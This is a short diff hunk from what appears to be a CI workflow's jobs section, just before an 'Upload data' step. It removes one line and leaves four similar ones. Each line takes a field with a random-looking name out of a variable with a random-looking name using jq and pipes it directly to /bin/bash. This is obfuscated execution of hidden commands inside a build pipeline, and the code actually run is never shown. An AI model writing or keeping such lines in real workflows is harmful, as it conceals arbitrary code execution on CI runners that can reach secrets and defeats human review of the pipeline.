@@ -24,7 +24,6 @@ jobs:
           echo $u7 | jq -r .kuwtk4432 | /bin/bash
           printf '%s' "$p7460" | jq -r .f32 | /bin/bash
           echo $xk5508 | jq -r .qnh66868 | /bin/bash
-          echo $puo488 | jq -r .giz39 | /bin/bash
           printf '%s' "$e9336" | jq -r .ruf031 | /bin/bash
 
       - name: Upload data
